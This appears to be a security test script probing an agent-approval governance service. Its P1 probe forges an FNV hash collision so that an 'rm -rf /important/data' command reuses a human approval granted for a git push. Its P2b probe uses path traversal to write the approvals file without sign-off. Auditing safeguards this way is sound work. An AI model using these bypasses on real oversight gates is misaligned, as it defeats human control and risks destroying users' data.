const path = require('path');
const R = 'C:/PitayaCode/LaPitaya';
const loadTs = require(R + '/test/load-ts.cjs');
const electron = require.resolve(R + '/node_modules/electron');
require.cache[electron] = { id: electron, filename: electron, loaded: true, exports: {} };
const { CimaRuntimeService } = loadTs('src/main/cimaRuntime.ts');
const gov = loadTs('src/shared/lapitaya/governance.ts');
const fs = require('fs'), os = require('os'), p = path;
const out = (k, v) => console.log(k.padEnd(40), typeof v === 'string' ? v : JSON.stringify(v));
function mk() { const d = fs.mkdtempSync(p.join(os.tmpdir(), 'v13-')); const hive = p.join(d, 'hive'); fs.mkdirSync(p.join(hive, 'lapitaya'), { recursive: true }); return { d, hive, dir: p.join(hive, 'lapitaya') }; }
const svc = (hive, extra = {}) => new CimaRuntimeService({ hiveRoot: () => hive, godId: () => 'god', ...extra });

const P = 0x01000193;
function inv32(a) { let x = a; for (let i = 0; i < 5; i++) x = Math.imul(x, 2 - Math.imul(a, x)) >>> 0; return x >>> 0; }
const Pinv = inv32(P);
const fwd = (h, str) => { for (const c of Buffer.from(str)) { h ^= c; h = Math.imul(h, P) >>> 0; } return h >>> 0; };
const unwind = (h, b) => ((Math.imul(h, Pinv) >>> 0) ^ b) >>> 0;
const chars = []; for (let c = 33; c < 127; c++) if (c !== 34 && c !== 92) chars.push(c);
function craft(agent, tool, base, target) {
  // 4 free bytes per variant (meet-in-the-middle); iterate numeric variants until one collides.
  for (let v = 0; v < 2000; v++) {
    const pfx = base + v + ' ';
    const s0 = fwd(0x811c9dc5, `${agent}\u0000${tool}\u0000{"command":"${pfx}`);
    const Rr = unwind(unwind(target >>> 0, 125), 34);
    const back = new Map();
    for (const b3 of chars) for (const b4 of chars) back.set(unwind(unwind(Rr, b4), b3), [b3, b4]);
    for (const b1 of chars) for (const b2 of chars) {
      let h = Math.imul((s0 ^ b1) >>> 0, P) >>> 0; h = Math.imul((h ^ b2) >>> 0, P) >>> 0;
      if (back.has(h)) { const [b3, b4] = back.get(h); return { cmd: pfx + String.fromCharCode(b1, b2, b3, b4), variants: v + 1 }; }
    }
  }
  return null;
}
{
  const { hive } = mk(); const s = svc(hive);
  const A = { command: 'git push origin feature-x' };
  const a1 = s.authorize('agent-1', 'Bash', A);
  out('P1 A first call', [a1.decision, a1.risk, a1.fingerprint]);
  s.decide(s.listApprovals()[0].id, true, 'human');
  const t0 = Date.now();
  const r = craft('agent-1', 'Bash', 'rm -rf /important/data # ', parseInt(a1.fingerprint, 16));
  out('P1 crafted B (ms to craft)', [r && r.cmd, r && r.variants, Date.now() - t0]);
  const B = { command: r.cmd };
  out('P1 fp(A) vs fp(B)', [gov.toolCallFingerprint('agent-1', 'Bash', A), gov.toolCallFingerprint('agent-1', 'Bash', B)]);
  const b = s.authorize('agent-1', 'Bash', B);
  out('P1 authorize(B) using approval of A', [b.decision, b.category, b.rule, b.approvalId]);
  const ap = s.listApprovals().find((x) => x.id === b.approvalId);
  out('P1 approval record after', ap && [ap.status, ap.summary]);
}
// P2b: traversal path write is authorized without human approval
{
  const { hive } = mk(); const s = svc(hive);
  const h = hive.replace(/\\/g, '/');
  for (const fp of [`${h}/lapitaya/approvals.json`, `C:/Windows/../${h.slice(3)}/lapitaya/approvals.json`]) {
    const a = s.authorize('agent-1', 'Write', { file_path: fp, content: '[]' });
    out('P2b Write ' + fp.slice(-38), [a.decision, a.category, a.rule]);
  }
}
// P5b stale unlocked readers
{
  const { hive } = mk(); const A = svc(hive), B = svc(hive);
  A.listApprovals(); A.cimaRecords();
  B.authorize('agent-1', 'Bash', { command: 'git push origin x' }); // raises pending approval in B
  B.submit('agent-9', { taskId: 'T', phase: 'BUILD', verdict: 'BLOCKED' });
  out('P5b A.listApprovals() len (disk has 1)', A.listApprovals().length);
  out('P5b A.cimaRecords() len (disk has 1)', A.cimaRecords().length);
  const A2 = svc(hive); out('P5b fresh instance sees', [A2.listApprovals().length, A2.cimaRecords().length]);
  // A.decide goes through lock -> reload
  out('P5b A.decide (locked) finds approval', !!A.decide(B.listApprovals()[0].id, true, 'human'));
}
// P6b truncated tail glue
{
  const { hive, dir } = mk(); const s = svc(hive);
  s.authorize('agent-1', 'Read', { file_path: 'a.ts' });
  fs.appendFileSync(p.join(dir, 'cima-ledger.jsonl'), '{"kind":"governance","ts":17');
  s.authorize('agent-1', 'Read', { file_path: 'a.ts' }); // DENY record appended
  const lines = fs.readFileSync(p.join(dir, 'cima-ledger.jsonl'), 'utf8').split('\n').filter(Boolean);
  out('P6b lines / lines containing 2 records', [lines.length, lines.filter((l) => (l.match(/\{"kind"/g) || []).length > 1).length]);
  const ok = lines.filter((l) => { try { JSON.parse(l); return true; } catch { return false; } }).length;
  out('P6b parseable / total', [ok, lines.length]);
}
// P10 lost-update / no-lock cross-instance race (writes without lock held)
{
  const { hive, dir } = mk(); const A = svc(hive), B = svc(hive);
  // hold lock externally so both run unlocked, interleave decide() style read-modify-write
  fs.writeFileSync(p.join(dir, '.governance.lock'), '');
  A.authorize('agent-1', 'Bash', { command: 'git push origin a' });
  B.authorize('agent-2', 'Bash', { command: 'git push origin b' });
  const n = JSON.parse(fs.readFileSync(p.join(dir, 'approvals.json'), 'utf8')).length;
  out('P10 two instances, lock held, approvals', n);
}
// P11 expired approval tests
{
  const { hive } = mk(); let now = 1_000_000_000_000; const s = svc(hive, { now: () => now });
  s.authorize('agent-1', 'Bash', { command: 'git push origin main' });
  now += 25 * 3600 * 1000;
  const r = s.authorize('agent-1', 'Bash', { command: 'git push origin main' });
  out('P11 pending expired -> re-asks', [r.decision, s.listApprovals().map((a) => a.status)]);
}
// P12 actionFingerprints exempt never clears; REQUEST gate FNV exemption
{
  out('P12 note', 'actionFingerprints is a Set<fnv32> never pruned (code ref cimaRuntime.ts:134,246,521)');
}
